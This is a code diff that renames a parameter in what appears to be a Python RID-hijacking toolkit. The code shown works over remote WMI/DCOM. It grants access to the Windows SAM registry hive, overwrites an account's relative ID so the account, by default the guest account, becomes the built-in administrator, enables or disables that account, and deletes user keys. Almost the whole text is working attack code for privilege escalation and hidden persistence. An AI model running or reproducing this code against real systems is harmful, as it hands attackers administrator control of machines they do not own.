@@ -47,7 +47,7 @@ class RID_Hijack_Toolkit():
                     break
         iWbemServices.RemRelease()
 
-    def Permissions_Controller(self, action, hijack_Target):
+    def Permissions_Controller(self, action, user):
         exec_command = EXEC_COMMAND(self.iWbemLevel1Login)
         regini_Attr =[
             r'HKEY_LOCAL_MACHINE\SAM [1 17]',
@@ -55,7 +55,7 @@ class RID_Hijack_Toolkit():
             r'HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]',
             r'HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17]',
             r'HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17]',
-            r"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\%s [1 17]"%str(format(int(hex(int(hijack_Target)), 16), '08x'))
+            r"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\%s [1 17]"%str(format(int(hex(int(user)), 16), '08x'))
         ]
 
         if "retrieve" in action:
@@ -82,7 +82,7 @@ class RID_Hijack_Toolkit():
             exec_command.exec_command_silent(command=cmd)
 
     # Default is hijacking guest(RID=501) users to administrator(RID=500)
-    def hijack(self, action, hijack_Target, hijack_RID=None):
+    def hijack(self, action, user, hijack_RID=None):
         iWbemServices = self.iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
         self.iWbemLevel1Login.RemRelease()
 
@@ -90,18 +90,18 @@ class RID_Hijack_Toolkit():
         StdRegProv, resp = iWbemServices2.GetObject("StdRegProv")
 
         try: 
-            iEnumWbemClassObject = iWbemServices.ExecQuery('SELECT * FROM Win32_UserAccount where SID like "%-{}"'.format(hijack_Target))
+            iEnumWbemClassObject = iWbemServices.ExecQuery('SELECT * FROM Win32_UserAccount where SID like "%-{}"'.format(user))
             Users_Info = iEnumWbemClassObject.Next(0xffffffff,1)[0]
         except Exception as e:
             if "WBEM_S_FALSE" in str(e):
-                print("[-] User with RID: %s not found!"%hijack_Target)
+                print("[-] User with RID: %s not found!"%user)
             else:
                 print("[-] Unexpected error: %s"%str(e))
             self.dcom.disconnect()
             sys.exit(0)
         
         try:
-            raw_value = StdRegProv.GetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(hijack_Target)), 16), '08x')), 'F')
+            raw_value = StdRegProv.GetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(user)), 16), '08x')), 'F')
             len(raw_value.uValue)
         except Exception as e:
             if "NoneType" in str(e):
@@ -135,7 +135,7 @@ class RID_Hijack_Toolkit():
                 # Index 12 is rid
                 if action == "hijack":
                     result[12] = int(hijack_RID)
-                    print('[+] Hijacking user from RID: %s to RID: %s'%(hijack_Target, hijack_RID))
+                    print('[+] Hijacking user from RID: %s to RID: %s'%(user, hijack_RID))
 
                 # Enable user index 14 = 532, disable is 533
                 elif action == "activate":
@@ -145,11 +145,11 @@ class RID_Hijack_Toolkit():
                     result[14] = 533
                     print("[+] Deactivate target user.")
                 
-                StdRegProv.SetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(hijack_Target)), 16), '08x')), 'F', result)
+                StdRegProv.SetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(user)), 16), '08x')), 'F', result)
                 
             else:
                 print("[+] Remove user.")
-                StdRegProv.DeleteKey(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(hijack_Target)), 16), '08x')))
+                StdRegProv.DeleteKey(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(user)), 16), '08x')))
             
             iWbemServices.RemRelease()
 
